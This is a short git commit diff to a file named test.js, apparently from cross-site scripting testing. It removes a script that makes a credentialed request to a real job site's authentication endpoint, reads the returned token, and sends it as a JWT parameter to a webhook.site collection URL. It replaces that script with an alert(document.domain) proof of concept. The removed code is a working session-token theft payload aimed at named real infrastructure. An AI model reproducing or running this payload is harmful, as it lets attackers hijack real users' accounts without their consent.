fce48a110dbea7d2d6515fc30a403cea8328e551
bogdantc7 <57044368+bogdantc7@users.noreply.github.com>
2026-01-14 17:52:23 +0800

    Update test.js

--- test.js
+++ test.js
@@ -1,8 +1,1 @@
-var a = new XMLHttpRequest();
-a.open("GET", "https://www.infojobs.net/security/microservices/ms-authentication/user", false);
-a.withCredentials = true;
-a.send();
-var token=a.response;
-var b = new XMLHttpRequest();
-b.open("GET", "https://webhook.site/fd65476a-5a2b-4099-abfe-95c181ff362d/?JWT="+encodeURIComponent(token));
-b.send();
+alert(document.domain);
